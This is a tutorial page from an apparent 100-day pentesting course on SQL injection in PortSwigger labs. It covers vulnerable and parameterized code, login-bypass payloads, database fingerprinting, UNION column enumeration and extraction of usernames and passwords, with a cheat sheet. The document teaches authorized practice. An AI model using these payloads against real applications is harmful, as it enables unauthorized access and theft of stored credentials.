# 100-Day Pentesting Challenge
## Day 20: SQL Injection Lab — Apprentice (PortSwigger)

> **Platform:** PortSwigger Web Security Academy (PSW) &nbsp;|&nbsp; **Difficulty:** Easy &nbsp;|&nbsp; **Time:** 2+ Hours

---

## What You'll Learn Today

| Topic | Why It Matters |
|---|---|
| What SQL Injection Is | Understand one of the most impactful web vulnerabilities |
| SQL Query Basics | Learn how applications interact with databases |
| Hidden Data Retrieval | Bypass SQL conditions to access additional records |
| Authentication Bypass | Manipulate login logic through SQL Injection |
| Database Fingerprinting | Identify the underlying database |
| UNION Attacks | Extract information from other database tables |

> SQL Injection remains one of the most important web application vulnerabilities. A single SQL Injection flaw can expose an application's entire database. :contentReference[oaicite:0]{index=0}

---

## PortSwigger Labs

| # | Lab | Focus |
|---|---|---|
| 1 | SQL Injection – Hidden Data | WHERE clause bypass |
| 2 | SQL Injection – Login Bypass | Authentication bypass |
| 3 | Database Version (Oracle) | Database fingerprinting |
| 4 | Database Version (MySQL/MSSQL) | Database fingerprinting |
| 5 | Listing Database Contents | Schema enumeration |
| 6 | UNION – Column Count | UNION preparation |
| 7 | UNION – Text Column | UNION data extraction |

---

## 2-Hour Schedule

| Time | Activity |
|---|---|
| 0:00 – 0:20 | SQL Injection fundamentals |
| 0:20 – 0:45 | Labs 1 & 2 |
| 0:45 – 1:00 | Database fingerprinting |
| 1:00 – 1:25 | Labs 3 & 4 |
| 1:25 – 1:40 | UNION attacks |
| 1:40 – 2:00 | Labs 5–7 and documentation |

---

## Must-Know Concepts

### 1. How SQL Queries Work

Typical login query:

```sql
SELECT *
FROM users
WHERE username='alice'
AND password='mypassword';
```

Typical product query:

```sql
SELECT name, price
FROM products
WHERE category='Electronics'
AND released=1;
```

---

### Vulnerable Code

```python
category = request.GET["category"]

query = "SELECT * FROM products WHERE category='" + category + "'"
```

Safe code:

```python
query = "SELECT * FROM products WHERE category=?"

cursor.execute(query, (category,))
```

Parameterized queries prevent user input from becoming part of SQL syntax.

---

### 2. Single Quote Test

The simplest SQL Injection test.

Normal request:

```text
/products?category=Electronics
```

Test:

```text
/products?category=Electronics'
```

Possible indicators:

- SQL error
- HTTP 500
- Different response
- Database error message

If no error appears, try:

```text
Electronics''

Electronics'--

Electronics'-- -
```

---

### 3. Hidden Data (WHERE Clause Bypass)

Original query:

```sql
SELECT *
FROM products
WHERE category='Gifts'
AND released=1;
```

---

### Test 1

```text
Gifts'
```

Purpose:

Confirm whether input reaches the SQL query.

---

### Test 2

```text
Gifts'--
```

Comments out the remainder of the query.

---

### Test 3

```text
' OR 1=1--
```

Result:

```sql
WHERE category=''
OR 1=1
```

The condition becomes true for every row.

---

### Burp Workflow

```text
Capture Request

↓

Send to Repeater

↓

Modify Parameter

↓

Send

↓

Compare Response
```

---

### 4. Login Bypass

Original query:

```sql
SELECT *
FROM users
WHERE username='alice'
AND password='secret';
```

Payload:

```text
administrator'--
```

Resulting query:

```sql
SELECT *
FROM users
WHERE username='administrator'--
```

The password comparison is ignored.

---

### Common Payloads

```sql
admin'--

' OR '1'='1

' OR '1'='1'--

' OR 1=1--

admin' OR 1=1--
```

---

### 5. SQL Comments

| Database | Comment |
|---|---|
| MySQL | `-- ` or `#` |
| MSSQL | `--` |
| PostgreSQL | `--` |
| Oracle | `--` |
| SQLite | `--` |

For MySQL URLs:

```text
--+

or

--%20
```

---

### Key Takeaways

- SQL Injection begins with understanding SQL queries.
- A single quote test is the simplest detection technique.
- WHERE clause bypass retrieves hidden records.
- Login bypass targets authentication logic.
- SQL comments terminate the remaining query.

---

### 6. Database Fingerprinting

Different database management systems use different SQL syntax.

Identifying the database helps determine which payloads will work.

---

### Version Queries

#### MySQL

```sql
SELECT @@version

SELECT version()
```

---

#### Microsoft SQL Server

```sql
SELECT @@version
```

---

#### Oracle

```sql
SELECT * FROM v$version

SELECT banner FROM v$version
```

---

#### PostgreSQL

```sql
SELECT version()
```

---

#### SQLite

```sql
SELECT sqlite_version()
```

---

### Error Message Identification

Common database errors:

| Database | Example Error |
|---|---|
| MySQL | SQL syntax error |
| MSSQL | Incorrect syntax near |
| Oracle | ORA-00933 |
| PostgreSQL | Unterminated quoted string |

---

### Database-Specific Syntax

String concatenation:

```sql
'a'||'b'
```

Oracle / PostgreSQL

```sql
'a'+'b'
```

Microsoft SQL Server

```sql
CONCAT('a','b')
```

MySQL

---

### Version Extraction Examples

Oracle:

```sql
' UNION SELECT banner,NULL FROM v$version--
```

MySQL / MSSQL:

```sql
' UNION SELECT @@version,NULL--
```

PostgreSQL:

```sql
' UNION SELECT version(),NULL--
```

---

### 7. UNION Attacks

UNION combines the results of multiple SQL queries.

Requirements:

- Same number of columns
- Compatible data types

---

### Finding Column Count

Method 1:

```sql
' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

' ORDER BY 4--
```

Increase the number until an error appears.

---

Method 2:

```sql
' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--
```

Increase the number of `NULL` values until the query succeeds.

---

### Finding a Text Column

```sql
' UNION SELECT 'A',NULL,NULL--

' UNION SELECT NULL,'A',NULL--

' UNION SELECT NULL,NULL,'A'--
```

The column displaying the text value can later be used to extract data.

---

### Extracting Information

List tables:

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

List columns:

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Extract usernames and passwords:

```sql
' UNION SELECT username,password
FROM users--
```

---

### 8. Listing Database Contents

Typical workflow:

```text
Find Column Count

↓

Find Text Column

↓

List Tables

↓

List Columns

↓

Extract Data
```

---

Example:

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

Then:

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Finally:

```sql
' UNION SELECT username,password
FROM users--
```

---

### 9. SQL Injection Locations

Always test every possible input.

Common locations:

- URL Parameters
- POST Body
- JSON Body
- Cookies
- HTTP Headers
- XML Data

---

### POST Example

```http
POST /login

username=admin'--

password=test
```

---

### JSON Example

```json
{
  "username":"admin'--",
  "password":"test"
}
```

---

### Header Example

```http
User-Agent: admin'--

X-Forwarded-For: 1' OR 1=1--

Referer: test'--
```

---

### Cookie Example

```http
Cookie:
session=abc123'--
```

---

### Key Takeaways

- Identify the database before choosing payloads.
- UNION attacks require matching columns.
- Enumerate tables before extracting data.
- SQL Injection is not limited to URL parameters.
- Test every source of user-controlled input.

---

## Quick Reference Cheatsheet

```text
Detection

'

''

'--

' OR 1=1--

Login Bypass

admin'--

' OR '1'='1

WHERE Clause

' OR 1=1--

Database Version

MySQL

SELECT @@version

SELECT version()

Oracle

SELECT * FROM v$version

PostgreSQL

SELECT version()

SQLite

SELECT sqlite_version()

Column Count

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

UNION

' UNION SELECT NULL--

Find Text Column

' UNION SELECT 'A',NULL--

Enumeration

information_schema.tables

information_schema.columns

Extract Data

' UNION SELECT username,password
FROM users--

Testing Locations

URL

POST

JSON

Cookies

Headers
```

---

## Day 20 Submission Task

```text
Complete all assigned PortSwigger SQL Injection labs.

Practice:

• Hidden Data Retrieval
• Login Bypass
• Database Fingerprinting
• UNION Attacks
• Database Enumeration

Capture every request using Burp Suite.

Document:

• SQL payloads tested
• Requests
• Responses
• Database identified
• Tables discovered
• Columns discovered
• Lessons learned

Save all notes in Markdown.

Push everything to:

100-days-pentest/
└── Day-20/

Include:

• PortSwigger completion screenshots
• Burp Repeater screenshots
• Successful payloads
• Notes
```

---

### Bonus Challenge

```text
Deploy a deliberately vulnerable SQL Injection lab.

Perform:

• Single Quote Test
• Hidden Data Retrieval
• Login Bypass
• Database Version Detection
• UNION Enumeration

For each step record:

• Payload
• Request
• Response
• Result
• Observation

Create a complete Markdown report summarizing your findings.
```

---

### Learning Workflow

```text
Detect SQL Injection

↓

Identify Database

↓

Find Column Count

↓

Find Text Column

↓

Enumerate Tables

↓

Enumerate Columns

↓

Extract Data

↓

Document Findings
```

---

### Best Practices

- Start with simple payloads before complex ones.
- Modify only one parameter at a time.
- Compare response codes and response lengths.
- Save interesting requests in Burp Repeater.
- Keep detailed notes for every successful payload.
- Practice only in authorized labs and training environments.

---

> **End of Day 20**

**Next Up:** **Day 21 — Cross-Site Scripting (XSS): Reflected, Stored & DOM-Based XSS**

---
